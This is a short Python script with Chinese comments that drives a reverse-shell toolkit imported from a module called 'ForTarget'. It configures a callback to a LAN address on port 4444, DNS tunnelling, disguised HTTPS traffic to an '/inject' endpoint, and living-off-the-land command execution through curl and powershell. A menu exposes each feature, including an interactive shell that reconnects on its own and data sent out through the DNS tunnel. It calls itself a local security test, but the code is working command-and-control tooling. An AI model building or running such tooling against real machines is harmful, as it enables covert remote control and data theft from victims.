"""
安全测试脚本 - 不修改任何系统文件
测试：shell会话、DNS隧道、HTTPS伪装、LOTL借壳
"""
from ForTarget import EnhancedReverseShell, DNSConfig, HTTPIsConfig, LOTLConfig

MAC_IP = '192.168.1.211'

shell = EnhancedReverseShell(
    host=MAC_IP,
    port=4444,
    dns_config=DNSConfig(
        domain='test.local',
        resolver=MAC_IP,
        resolver_port=5353,
    ),
    https_config=HTTPIsConfig(
        endpoint='/inject',
        use_tls=False,       # 本地测试不用 TLS
        verify_ssl=False,
    ),
    lotl_config=LOTLConfig(
        tools=['curl', 'powershell'],
    ),
)

MENU = """
========== 安全功能测试 ==========
1. 交互式 Shell 会话（断线自动重连）
2. DNS 隧道发送测试（需先在 Mac 启动 dns_tunnel_server.py）
3. DNS 查询测试
4. HTTPS 伪装请求测试（需先在 Mac 启动 listener_http.py）
5. LOTL 借壳执行命令
0. 退出
==================================
"""

while True:
    print(MENU)
    choice = input("选择功能: ").strip()

    if choice == '1':
        shell.shell_session()

    elif choice == '2':
        msg = input("输入要通过 DNS 隧道发送的内容: ")
        ok = shell.send_dns_tunnel(msg)
        print(f"[结果] {'成功' if ok else '失败'}")

    elif choice == '3':
        result = shell.query_dns()
        print(f"[DNS响应] {result}")

    elif choice == '4':
        msg = input("输入要发送的命令内容: ")
        result = shell.camouflage_https(msg)
        print(f"[HTTPS响应] {result}")

    elif choice == '5':
        cmd = input("输入要借壳执行的命令: ")
        result = shell.run_lotl_command(cmd)
        print(f"[LOTL输出] {result}")

    elif choice == '0':
        break
    else:
        print("无效输入")
